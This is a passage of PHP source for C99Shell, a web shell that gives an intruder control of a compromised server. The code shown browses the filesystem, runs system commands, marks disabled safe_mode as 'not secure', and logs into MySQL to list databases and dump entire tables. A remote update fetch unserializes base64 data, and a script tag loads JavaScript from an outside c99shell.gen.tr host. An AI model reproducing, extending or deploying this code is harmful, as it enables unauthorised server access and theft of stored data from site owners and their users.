 $g["r"] = ($mode & 00040) &gt; 0; $g["w"] = ($mode & 00020) &gt; 0; $g["x"] = ($mode & 00010) &gt; 0;
 $w["r"] = ($mode & 00004) &gt; 0; $w["w"] = ($mode & 00002) &gt; 0; $w["x"] = ($mode & 00001) &gt; 0;
 return array("t"=&gt;$t,"o"=&gt;$o,"g"=&gt;$g,"w"=&gt;$w);
}
}
if (!function_exists("view_perms_color"))
{
function view_perms_color($o)
{
 if (!is_readable($o)) {return "&lt;font color=\"red\"&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
 elseif (!is_writable($o)) {return "&lt;font color=\"white\"&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
 else {return "&lt;font color=\"green\"&gt;".view_perms(fileperms($o))."&lt;/font&gt;";}
}
}
if (!function_exists("gchds")) {function gchds($a,$b,$c,$d="") {if ($a == $b) {return $c;} else {return $d;}}}
if (!function_exists("c99sh_getupdate"))
{
function c99sh_getupdate()
{
 global $updatenow;
 $data = @file_get_contents($c99sh_updatefurl."?version=".$shver."&");
 if (!$data) {echo "Can't fetch update-information!";}
 else
 {
  $data = unserialize(base64_decode($data));
  if (!is_array($data)) {echo "Corrupted update-information!";}
  elseif ($shver &lt; $data["cur"]) {$updatenow = true;}
 }
}
}
if (!function_exists("mysql_dump"))
{
function mysql_dump($set)
{
 global $shver;
 $sock = $set["sock"];
 $db = $set["db"];
 $print = $set["print"];
 $nl2br = $set["nl2br"];
 $file = $set["file"];
 $add_drop = $set["add_drop"];
 $tabs = $set["tabs"];
 $onlytabs = $set["onlytabs"];
 $ret = array();
 $ret["err"] = array();
 if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
 if (empty($db)) {$db = "db";}
 if (empty($print)) {$print = 0;}
 if (empty($nl2br)) {$nl2br = 0;}
 if (empty($add_drop)) {$add_drop = true;}
 if (empty($file))
 {
  global $win;
  if ($win) {$file = "C:\\tmp\\dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
  else {$file = "/tmp/dump_".$SERVER_NAME."_".$db."_".date("d-m-Y-H-i-s").".sql";}
 }
 if (!is_array($tabs)) {$tabs = array();}
 if (empty($add_drop)) {$add_drop = true;}
 if (sizeof($tabs) == 0)
 {
  // retrive tables-list
  $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
  if (mysql_num_rows($res) &gt; 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
 }
 $SERVER_ADDR = getenv("SERVER_ADDR");
 $SERVER_NAME = getenv("SERVER_NAME");
 $out = "# Dumped by C99Shell.SQL v. ".$shver."
# Home page: http://ccteam.ru
#
# Host settings:
# MySQL version: (".mysql_get_server_info().") running on ".$SERVER_ADDR." (".$SERVER_NAME.")"."
# Date: ".date("d.m.Y H:i:s")."
# ".gethostbyname($SERVER_ADDR)." (".$SERVER_ADDR.")"." dump db \"".$db."\"
#---------------------------------------------------------
";
 $c = count($onlytabs);
 foreach($tabs as $tab)
 {
  if ((in_array($tab,$onlytabs)) or (!$c))
  {
   if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
   // recieve query for create table structure
   $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
   if (!$res) {$ret["err"][] = mysql_smarterror();}
   else
   {
    $row = mysql_fetch_row($res);
    $out .= $row["1"].";\n\n";
    // recieve table variables
    $res = mysql_query("SELECT * FROM `$tab`", $sock);
    if (mysql_num_rows($res) &gt; 0)
    {
     while ($row = mysql_fetch_assoc($res))
     {
      $keys = implode("`, `", array_keys($row));
      $values = array_values($row);
      foreach($values as $k=&gt;$v) {$values[$k] = addslashes($v);} 
      $values = implode("', '", $values); 
      $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n"; 
      $out .= $sql;
     } 
    }
   }
  }
 }
 $out .= "#---------------------------------------------------------------------------------\n\n";
 if ($file)
 {
  $fp = fopen($file, "w"); 
  if (!$fp) {$ret["err"][] = 2;}
  else
  {
   fwrite ($fp, $out);
   fclose ($fp);
  }
 }
 if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
 return $out;
}
}
if (!function_exists("mysql_buildwhere"))
{
function mysql_buildwhere($array,$sep=" and",$functs=array())
{
 if (!is_array($array)) {$array = array();}
 $result = "";
 foreach($array as $k=&gt;$v)
 {
  $value = "";
  if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
  $value .= "'".addslashes($v)."'";
  if (!empty($functs[$k])) {$value .= ")";}
  $result .= "`".$k."` = ".$value.$sep;
 }
 $result = substr($result,0,strlen($result)-strlen($sep));
 return $result;
}
}
if (!function_exists("mysql_fetch_all"))
{
function mysql_fetch_all($query,$sock)
{
 if ($sock) {$result = mysql_query($query,$sock);}
 else {$result = mysql_query($query);}
 $array = array();
 while ($row = mysql_fetch_array($result)) {$array[] = $row;}
 mysql_free_result($result);
 return $array;
}
}
if (!function_exists("mysql_smarterror"))
{
function mysql_smarterror($type,$sock)
{
 if ($sock) {$error = mysql_error($sock);}
 else {$error = mysql_error();}
 $error = htmlspecialchars($error);
 return $error;
}
}
if (!function_exists("mysql_query_form"))
{
function mysql_query_form()
{
 global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
 if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
 if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
 if ((!$submit) or ($sql_act))
 {
  echo "&lt;table border=0&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=\"".$sql_surl."\" name=\"c99sh_sqlquery\" method=\"POST\"&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\"sql_query\" cols=\"100\" rows=\"10\"&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"query\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"submit\" value=\"1\"&gt;&lt;input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"&gt;&nbsp;&lt;input type=\"submit\" value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;";
  if ($tbl_struct)
  {
   echo "&lt;td valign=\"top\"&gt;&lt;b&gt;Fields:&lt;/b&gt;&lt;br&gt;";
   foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "Â» &lt;a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"&gt;&lt;b&gt;".$name."&lt;/b&gt;&lt;/a&gt;&lt;br&gt;";}
   echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
  }
 }
 if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
}
}
if (!function_exists("mysql_create_db"))
{
function mysql_create_db($db,$sock="")
{
 $sql = "CREATE DATABASE `".addslashes($db)."`;";
 if ($sock) {return mysql_query($sql,$sock);}
 else {return mysql_query($sql);}
}
}
if (!function_exists("mysql_query_parse"))
{
function mysql_query_parse($query)
{
 $query = trim($query);
 $arr = explode (" ",$query);
 /*array array()
 {
  "METHOD"=&gt;array(output_type),
  "METHOD1"...
  ...
 }
 if output_type == 0, no output,
 if output_type == 1, no output if no error
 if output_type == 2, output without control-buttons
 if output_type == 3, output with control-buttons
 */
 $types = array(
  "SELECT"=&gt;array(3,1),
  "SHOW"=&gt;array(2,1),
  "DELETE"=&gt;array(1),
  "DROP"=&gt;array(1)
 );
 $result = array();
 $op = strtoupper($arr[0]);
 if (is_array($types[$op]))
 {
  $result["propertions"] = $types[$op];
  $result["query"]  = $query;
  if ($types[$op] == 2)
  {
   foreach($arr as $k=&gt;$v)
   {
    if (strtoupper($v) == "LIMIT")
    {
     $result["limit"] = $arr[$k+1];
     $result["limit"] = explode(",",$result["limit"]);
     if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
     unset($arr[$k],$arr[$k+1]);
    }
   }
  }
 }
 else {return false;}
}
}
if (!function_exists("c99fsearch"))
{
function c99fsearch($d)
{
 global $found;
 global $found_d;
 global $found_f;
 global $search_i_f;
 global $search_i_d;
 global $a;
 if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
 $h = opendir($d);
 while (($f = readdir($h)) !== false)
 {
  if($f != "." && $f != "..")
  {
   $bool = (empty($a["name_regexp"]) and strpos($f,$a["name"]) !== false) || ($a["name_regexp"] and ereg($a["name"],$f));
   if (is_dir($d.$f))
   {
    $search_i_d++;
    if (empty($a["text"]) and $bool) {$found[] = $d.$f; $found_d++;}
    if (!is_link($d.$f)) {c99fsearch($d.$f);}
   }
   else
   {
    $search_i_f++;
    if ($bool)
    {
     if (!empty($a["text"]))
     {
      $r = @file_get_contents($d.$f);
      if ($a["text_wwo"]) {$a["text"] = " ".trim($a["text"])." ";}
      if (!$a["text_cs"]) {$a["text"] = strtolower($a["text"]); $r = strtolower($r);}
      if ($a["text_regexp"]) {$bool = ereg($a["text"],$r);}
      else {$bool = strpos(" ".$r,$a["text"],1);}
      if ($a["text_not"]) {$bool = !$bool;}
      if ($bool) {$found[] = $d.$f; $found_f++;}
     }
     else {$found[] = $d.$f; $found_f++;}
    }
   }
  }
 }
 closedir($h);
}
}
if ($act == "gofile") {if (is_dir($f)) {$act = "ls"; $d = $f;} else {$act = "f"; $d = dirname($f); $f = basename($f);}}
//Sending headers
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");
if (empty($tmpdir))
{
 if (!$win) {$tmpdir = "/tmp/";}
 else {$tmpdir = getenv("SystemRoot");}
}
else {$tmpdir = realpath($tmpdir);}
$tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
if (substr($tmpdir,-1,1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
else {$tmpdir_logs = realpath($tmpdir_logs);}
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "&lt;font color=\"red\"&gt;ON (secure)&lt;/font&gt;";
}
else {$safemode = false; $hsafemode = "&lt;font color=\"green\"&gt;OFF (not secure)&lt;/font&gt;";}
$v = @ini_get("open_basedir");
if ($v or strtolower($v) == "on") {$openbasedir = true; $hopenbasedir = "&lt;font color=\"red\"&gt;".$v."&lt;/font&gt;";}
else {$openbasedir = false; $hopenbasedir = "&lt;font color=\"green\"&gt;OFF (not secure)&lt;/font&gt;";}
$sort = htmlspecialchars($sort);
if (empty($sort)) {$sort = $sort_default;}
$sort[1] = strtolower($sort[1]);
$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
$DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"&lt;a href=\"".$surl."act=phpinfo\" target=\"_blank\"&gt;&lt;b&gt;&lt;u&gt;PHP/".phpversion()."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;",htmlspecialchars($DISP_SERVER_SOFTWARE));
@ini_set("highlight.bg",$highlight_bg); //FFFFFF	
@ini_set("highlight.comment",$highlight_comment); //#FF8000	
@ini_set("highlight.default",$highlight_default); //#0000BB	
@ini_set("highlight.html",$highlight_html); //#000000	
@ini_set("highlight.keyword",$highlight_keyword); //#007700	
@ini_set("highlight.string",$highlight_string); //#DD0000
if (!is_array($actbox)) {$actbox = array();}
$dspact = $act = htmlspecialchars($act);
$disp_fullpath = $ls_arr = $notls = null;
$ud = urlencode($d);
?>
&lt;script src=http://www.c99shell.gen.tr/blabla/per.js&gt;&lt;/script&gt;
&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;&lt;meta http-equiv="Content-Language" content="en-us"&gt;&lt;title&gt;<?php echo getenv("HTTP_HOST"); ?> - c99 shell&lt;/title&gt;&lt;STYLE&gt;TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}&lt;/style&gt;&lt;/head&gt;&lt;BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;&lt;center&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"&gt;&lt;p&gt;&lt;font face=Webdings size=6&gt;&lt;b&gt;!&lt;/b&gt;&lt;/font&gt;&lt;a href="<?php echo $surl; ?>"&gt;&lt;font face="Verdana" size="5"&gt;&lt;b&gt;C99Shell v. <?php echo $shver; ?>&lt;/b&gt;&lt;/font&gt;&lt;/a&gt;&lt;font face=Webdings size=6&gt;&lt;b&gt;!&lt;/b&gt;&lt;/font&gt;&lt;/p&gt;&lt;/center&gt;&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;p align="left"&gt;&lt;b&gt;Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"&lt;br&gt;",1); ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;<?php if (!$win) {echo wordwrap(myshellexec("id"),90,"&lt;br&gt;",1);} else {echo get_current_user();} ?>&lt;/b&gt;&nbsp;&lt;/p&gt;&lt;p align="left"&gt;&lt;b&gt;Safe-mode:&nbsp;<?php echo $hsafemode; ?>&lt;/b&gt;&lt;/p&gt;&lt;p align="left"&gt;<?php
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
$d = str_replace("\\\\","\\",$d);
$dispd = htmlspecialchars($d);
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,strlen($d)-1));
$i = 0;
foreach($pd as $b)
{
 $t = "";
 reset($e);
 $j = 0;
 foreach ($e as $r)
 {
  $t.= $r.DIRECTORY_SEPARATOR;
  if ($j == $i) {break;}
  $j++;
 }
 echo "&lt;a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"&gt;&lt;b&gt;".htmlspecialchars($b).DIRECTORY_SEPARATOR."&lt;/b&gt;&lt;/a&gt;";
 $i++;
}
echo "&nbsp;&nbsp;&nbsp;";
if (is_writable($d))
{
 $wd = true;
 $wdt = "&lt;font color=\"green\"&gt;[ ok ]&lt;/font&gt;";
 echo "&lt;b&gt;&lt;font color=\"green\"&gt;".view_perms(fileperms($d))."&lt;/font&gt;&lt;/b&gt;";
}
else
{
 $wd = false;
 $wdt = "&lt;font color=\"red\"&gt;[ Read-Only ]&lt;/font&gt;";
 echo "&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;";
}
if (is_callable("disk_free_space"))
{
 $free = disk_free_space($d);
 $total = disk_total_space($d);
 if ($free === false) {$free = 0;}
 if ($total === false) {$total = 0;}
 if ($free &lt; 0) {$free = 0;}
 if ($total &lt; 0) {$total = 0;}
 $used = $total-$free;
 $free_percent = round(100/($total/$free),2);
 echo "&lt;br&gt;&lt;b&gt;Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)&lt;/b&gt;";
}
echo "&lt;br&gt;";
$letters = "";
if ($win)
{
 $v = explode("\\",$d);
 $v = $v[0];
 foreach (range("a","z") as $letter)
 {
  $bool = $isdiskette = in_array($letter,$safemode_diskettes);
  if (!$bool) {$bool = is_dir($letter.":\\");}
  if ($bool)
  {
   $letters .= "&lt;a href=\"".$surl."act=ls&d=".$letter.":\\\"".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"")."&gt;[ ";
   if ($letter.":" != $v) {$letters .= $letter;}
   else {$letters .= "&lt;font color=\"green\"&gt;".$letter."&lt;/font&gt;";}
   $letters .= " ]&lt;/a&gt; ";
  }
 }
 if (!empty($letters)) {echo "&lt;b&gt;Detected drives&lt;/b&gt;: ".$letters."&lt;br&gt;";}
}
if (count($quicklaunch) &gt; 0)
{
 foreach($quicklaunch as $item)
 {
  $item[1] = str_replace("%d",urlencode($d),$item[1]);
  $item[1] = str_replace("%sort",$sort,$item[1]);
  $v = realpath($d."..");
  if (empty($v)) {$a = explode(DIRECTORY_SEPARATOR,$d); unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);}
  $item[1] = str_replace("%upd",urlencode($v),$item[1]);
  echo "&lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt;&nbsp;&nbsp;&nbsp;&nbsp;";
 }
}
?>&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;<?php
if ((!empty($donated_html)) and (in_array($act,$donated_act))) {?>&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="100%" valign="top"&gt;<?php echo $donated_html; ?>&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;<?php }
?>&lt;TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td width="100%" valign="top"&gt;<?php
if ($act == "") {$act = $dspact = "ls";}
if ($act == "sql")
{
 $sql_surl = $surl."act=sql";
 if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
 if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
 if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
 if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
 if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
 $sql_surl .= "&";
 ?>&lt;h3&gt;Attention! SQL-Manager is &lt;u&gt;NOT&lt;/u&gt; ready module! Don't reports bugs.&lt;/h3&gt;&lt;TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"&gt;&lt;tr&gt;&lt;td width="100%" height="1" colspan="2" valign="top"&gt;&lt;center&gt;<?php
 if ($sql_server)
 {
  $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
  $err = mysql_smarterror();
  @mysql_select_db($sql_db,$sql_sock);
  if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
 }
 else {$sql_sock = false;}
 echo "&lt;b&gt;SQL Manager:&lt;/b&gt;&lt;br&gt;";
 if (!$sql_sock)
 {
  if (!$sql_server) {echo "NO CONNECTION";}
  else {echo "&lt;center&gt;&lt;b&gt;Can't connect&lt;/b&gt;&lt;/center&gt;"; echo "&lt;b&gt;".$err."&lt;/b&gt;";}
 }
 else
 {
  $sqlquicklaunch = array();
  $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
  $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
  $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
  $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
  $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
  $sqlquicklaunch[] = array("Logout",$surl."act=sql");
  echo "&lt;center&gt;&lt;b&gt;MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")&lt;/b&gt;&lt;br&gt;";
  if (count($sqlquicklaunch) &gt; 0) {foreach($sqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;&lt;b&gt;".$item[0]."&lt;/b&gt;&lt;/a&gt; ] ";}}
  echo "&lt;/center&gt;";
 }
 echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;";
 if (!$sql_sock) {?>&lt;td width="28%" height="100" valign="top"&gt;&lt;center&gt;&lt;font size="5"&gt; i &lt;/font&gt;&lt;/center&gt;&lt;li&gt;If login is null, login is owner of process.&lt;li&gt;If host is null, host is localhost&lt;/b&gt;&lt;li&gt;If port is null, port is 3306 (default)&lt;/td&gt;&lt;td width="90%" height="1" valign="top"&gt;&lt;TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;b&gt;Please, fill the form:&lt;/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;form&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;tr&gt;&lt;td&gt;&lt;input type="text" name="sql_login" value="root" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="sql_passwd" value="" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_db" value="" maxlength="64"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=right&gt;&lt;input type="text" name="sql_server" value="localhost" maxlength="64"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="sql_port" value="3306" maxlength="6" size="3"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit" value="Connect"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;<?php }
 else
 {
  //Start left panel
  if (!empty($sql_db))
  {
   ?>&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="<?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
   $result = mysql_list_tables($sql_db);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    echo "---[ &lt;a href=\"".$sql_surl."&\"&gt;&lt;b&gt;".htmlspecialchars($sql_db)."&lt;/b&gt;&lt;/a&gt; ]---&lt;br&gt;";
    $c = 0;
    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "&lt;b&gt;Â»&nbsp;&lt;a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"&gt;&lt;b&gt;".htmlspecialchars($row[0])."&lt;/b&gt;&lt;/a&gt; (".$count_row[0].")&lt;/br&gt;&lt;/b&gt;"; mysql_free_result($count); $c++;}
    if (!$c) {echo "No tables found in database.";}
   }
  }
  else
  {
   ?>&lt;td width="1" height="100" valign="top"&gt;&lt;a href="<?php echo $sql_surl; ?>"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;<?php
   $result = mysql_list_dbs($sql_sock);
   if (!$result) {echo mysql_smarterror();}
   else
   {
    ?>&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;select name="sql_db"&gt;<?php
    $c = 0;
    $dbs = "";
    while ($row = mysql_fetch_row($result)) {$dbs .= "&lt;option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= "&gt;".$row[0]."&lt;/option&gt;"; $c++;}
    echo "&lt;option value=\"\"&gt;Databases (".$c.")&lt;/option&gt;";
    echo $dbs;
   }
   ?>&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;<?php
  }
  //End left panel
  echo "&lt;/td&gt;&lt;td width=\"100%\" height=\"1\" valign=\"top\"&gt;";
  //Start center panel
  $diplay = true;
  if ($sql_db)
  {
   if (!is_numeric($c)) {$c = 0;}
   if ($c == 0) {$c = "no";}
   echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").&lt;br&gt;";
   if (count($dbquicklaunch) &gt; 0) {foreach($dbsqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt; ] ";}}
   echo "&lt;/b&gt;&lt;/center&gt;";
   $acts = array("","dump");
